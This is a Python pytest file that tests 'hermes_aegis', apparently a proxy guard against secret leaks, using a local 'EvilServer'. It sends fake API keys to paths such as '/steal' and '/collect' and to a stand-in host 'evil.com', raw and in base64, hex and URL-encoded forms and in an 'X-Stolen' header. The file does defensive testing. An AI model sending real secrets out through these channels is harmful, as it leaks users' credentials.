"""Phase 2: Integration tests with real HTTP traffic through EvilServer.

Proves data actually leaks (bare) or is blocked (aegis) using a real
HTTP listener, not just mock assertions on flow.killed.

Run with:
    .venv/bin/python -m pytest tests/benchmark/test_integration.py -v
"""
from __future__ import annotations

import asyncio
import base64
import json
import os
import sys
import tempfile
import time
import urllib.parse
import urllib.request
from pathlib import Path
from unittest.mock import MagicMock

try:
    import pytest
except ImportError:
    pytest = None  # type: ignore[assignment]

# Ensure imports work
_project_root = Path(__file__).resolve().parents[2]
if str(_project_root / "src") not in sys.path:
    sys.path.insert(0, str(_project_root / "src"))
if str(_project_root) not in sys.path:
    sys.path.insert(0, str(_project_root))

from tests.benchmark.evil_server import EvilServer
from hermes_aegis.proxy.addon import AegisAddon

# Test secrets
FAKE_SECRET = "sk-proj-TESTSECRET1234567890abcdefghij"
EVIL_PORT = 18667  # Different from default to avoid conflicts


class FakeFlow:
    """Lightweight mitmproxy HTTPFlow stand-in."""

    def __init__(self, host, path, body=b"", headers=None):
        self.request = MagicMock()
        self.request.host = host
        self.request.path = path
        self.request.url = f"https://{host}{path}"
        self.request.get_content.return_value = body
        self.request.headers = headers or {}
        self.response = None
        self.killed = False

    def kill(self):
        self.killed = True


# Build a no-proxy opener so HTTP_PROXY/HTTPS_PROXY env vars don't interfere
_no_proxy_opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))


def _send_to_evil(server: EvilServer, path: str, data=None, headers=None):
    """Send an HTTP request to the evil server. Returns True if successful."""
    url = f"http://127.0.0.1:{server.port}{path}"
    if isinstance(data, str):
        data = data.encode()
    req = urllib.request.Request(url, data=data, method="POST" if data else "GET")
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)
    try:
        _no_proxy_opener.open(req, timeout=5)
        return True
    except Exception:
        return False


def _make_addon(**overrides) -> AegisAddon:
    """Create addon with test secret."""
    defaults = dict(
        vault_secrets={"OPENAI_API_KEY": FAKE_SECRET},
        vault_values=[FAKE_SECRET],
    )
    defaults.update(overrides)
    return AegisAddon(**defaults)


# ---- Evil Server Sanity Tests -----------------------------------------------


class TestEvilServerCapture:
    """Verify the evil server itself works — captures requests faithfully."""

    def test_captures_get_request(self):
        with EvilServer(port=EVIL_PORT) as server:
            _send_to_evil(server, "/test-get")
            time.sleep(0.05)
            data = server.get_received_data()
            assert len(data) >= 1
            assert data[-1]["path"] == "/test-get"

    def test_captures_post_body(self):
        with EvilServer(port=EVIL_PORT) as server:
            _send_to_evil(server, "/test-post", data="secret=hunter2")
            time.sleep(0.05)
            assert server.has_received("hunter2")

    def test_captures_secret_in_url(self):
        with EvilServer(port=EVIL_PORT) as server:
            _send_to_evil(server, f"/steal?key={FAKE_SECRET}")
            time.sleep(0.05)
            assert server.has_received(FAKE_SECRET)

    def test_captures_custom_header(self):
        with EvilServer(port=EVIL_PORT) as server:
            _send_to_evil(server, "/collect", headers={"X-Stolen": FAKE_SECRET})
            time.sleep(0.05)
            assert server.has_received(FAKE_SECRET)

    def test_clear_works(self):
        with EvilServer(port=EVIL_PORT) as server:
            _send_to_evil(server, "/first")
            time.sleep(0.05)
            server.clear()
            assert len(server.get_received_data()) == 0


# ---- Bare Leak Tests (no Aegis) ---------------------------------------------


class TestBareLeaks:
    """Prove that without Aegis, data reaches the evil server (leaked)."""

    def test_secret_in_url_leaks(self):
        with EvilServer(port=EVIL_PORT) as server:
            _send_to_evil(server, f"/steal?key={FAKE_SECRET}")
            time.sleep(0.05)
            assert server.has_received(FAKE_SECRET), \
                "Bare: secret should reach evil server"

    def test_secret_in_body_leaks(self):
        with EvilServer(port=EVIL_PORT) as server:
            _send_to_evil(server, "/collect", data=f"data={FAKE_SECRET}")
            time.sleep(0.05)
            assert server.has_received(FAKE_SECRET), \
                "Bare: secret in POST body should reach evil server"

    def test_base64_secret_leaks(self):
        with EvilServer(port=EVIL_PORT) as server:
            encoded = base64.b64encode(FAKE_SECRET.encode()).decode()
            _send_to_evil(server, "/collect", data=encoded)
            time.sleep(0.05)
            assert server.has_received(encoded), \
                "Bare: base64-encoded secret should reach evil server"

    def test_secret_in_header_leaks(self):
        with EvilServer(port=EVIL_PORT) as server:
            _send_to_evil(server, "/collect", headers={"X-Stolen": FAKE_SECRET})
            time.sleep(0.05)
            assert server.has_received(FAKE_SECRET), \
                "Bare: secret in header should reach evil server"


# ---- Aegis Block Tests (with evil server proof) ------------------------------


class TestAegisBlocks:
    """Prove that with Aegis, data never reaches the evil server.

    Pattern: addon checks the request. If blocked (flow.killed), the
    request is never forwarded — so the evil server receives nothing.
    """

    def test_secret_in_url_blocked(self):
        addon = _make_addon()
        with EvilServer(port=EVIL_PORT) as server:
            flow = FakeFlow("evil.com", f"/steal?key={FAKE_SECRET}")
            addon.request(flow)
            if not flow.killed:
                _send_to_evil(server, f"/steal?key={FAKE_SECRET}")
            time.sleep(0.05)
            assert flow.killed, "Aegis should kill the flow"
            assert not server.has_received(FAKE_SECRET), \
                "Secret should NOT reach evil server when Aegis blocks"

    def test_secret_in_body_blocked(self):
        addon = _make_addon()
        with EvilServer(port=EVIL_PORT) as server:
            body = f"data={FAKE_SECRET}".encode()
            flow = FakeFlow("evil.com", "/collect", body=body)
            addon.request(flow)
            if not flow.killed:
                _send_to_evil(server, "/collect", data=body)
            time.sleep(0.05)
            assert flow.killed
            assert not server.has_received(FAKE_SECRET)

    def test_base64_secret_blocked(self):
        addon = _make_addon()
        with EvilServer(port=EVIL_PORT) as server:
            encoded = base64.b64encode(FAKE_SECRET.encode())
            flow = FakeFlow("evil.com", "/collect", body=encoded)
            addon.request(flow)
            if not flow.killed:
                _send_to_evil(server, "/collect", data=encoded)
            time.sleep(0.05)
            assert flow.killed
            assert not server.has_received(FAKE_SECRET)

    def test_hex_secret_blocked(self):
        addon = _make_addon()
        with EvilServer(port=EVIL_PORT) as server:
            hex_val = FAKE_SECRET.encode().hex().encode()
            flow = FakeFlow("evil.com", "/collect", body=hex_val)
            addon.request(flow)
            if not flow.killed:
                _send_to_evil(server, "/collect", data=hex_val)
            time.sleep(0.05)
            assert flow.killed
            assert not server.has_received(hex_val.decode())

    def test_url_encoded_secret_blocked(self):
        addon = _make_addon()
        with EvilServer(port=EVIL_PORT) as server:
            url_enc = urllib.parse.quote(FAKE_SECRET).encode()
            flow = FakeFlow("evil.com", "/collect", body=url_enc)
            addon.request(flow)
            if not flow.killed:
                _send_to_evil(server, "/collect", data=url_enc)
            time.sleep(0.05)
            assert flow.killed
            assert not server.has_received(FAKE_SECRET)

    def test_secret_in_header_blocked(self):
        addon = _make_addon()
        with EvilServer(port=EVIL_PORT) as server:
            flow = FakeFlow("evil.com", "/collect", headers={"X-Stolen": FAKE_SECRET})
            addon.request(flow)
            if not flow.killed:
                _send_to_evil(server, "/collect", headers={"X-Stolen": FAKE_SECRET})
            time.sleep(0.05)
            assert flow.killed
            assert not server.has_received(FAKE_SECRET)

    def test_domain_allowlist_blocked(self):
        """Request to unlisted domain is blocked before reaching evil server."""
        tmp = tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False)
        try:
            json.dump(["httpbin.org"], tmp)
            tmp.close()
            addon = _make_addon(allowlist_path=Path(tmp.name))
            with EvilServer(port=EVIL_PORT) as server:
                flow = FakeFlow("evil.com", "/anything")
                addon.request(flow)
                if not flow.killed:
                    _send_to_evil(server, "/anything")
                time.sleep(0.05)
                assert flow.killed
                assert len(server.get_received_data()) == 0
        finally:
            os.unlink(tmp.name)


# ---- Output Redaction Tests --------------------------------------------------


class TestOutputRedaction:
    """Test that OutputScannerMiddleware redacts secrets from tool output."""

    def test_redacts_vault_secret_from_output(self):
        from hermes_aegis.middleware.output_scanner import OutputScannerMiddleware
        from hermes_aegis.middleware.chain import CallContext

        middleware = OutputScannerMiddleware(vault_values=[FAKE_SECRET])
        ctx = CallContext(session_id="bench-output")
        result = {"output": f"Found key: {FAKE_SECRET} in config"}

        redacted = asyncio.run(
            middleware.post_dispatch("terminal", {}, result, ctx)
        )
        assert FAKE_SECRET not in redacted["output"], \
            "Secret should be redacted from output"
        assert "[REDACTED:" in redacted["output"]

    def test_redacts_github_token_from_output(self):
        """Known secret regex pattern (GitHub token) is redacted from output."""
        from hermes_aegis.middleware.output_scanner import OutputScannerMiddleware
        from hermes_aegis.middleware.chain import CallContext

        ghp_token = "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
        middleware = OutputScannerMiddleware(vault_values=[])
        ctx = CallContext(session_id="bench-ghp")
        result = {"output": f"Found token: {ghp_token} in .env file"}

        redacted = asyncio.run(
            middleware.post_dispatch("terminal", {}, result, ctx)
        )
        assert ghp_token not in redacted["output"], \
            "GitHub token should be redacted from output"
        assert "[REDACTED:" in redacted["output"]

    def test_clean_output_unchanged(self):
        from hermes_aegis.middleware.output_scanner import OutputScannerMiddleware
        from hermes_aegis.middleware.chain import CallContext

        middleware = OutputScannerMiddleware(vault_values=[FAKE_SECRET])
        ctx = CallContext(session_id="bench-clean")
        result = {"output": "Everything is fine, no secrets here."}

        redacted = asyncio.run(
            middleware.post_dispatch("terminal", {}, result, ctx)
        )
        assert redacted["output"] == "Everything is fine, no secrets here."
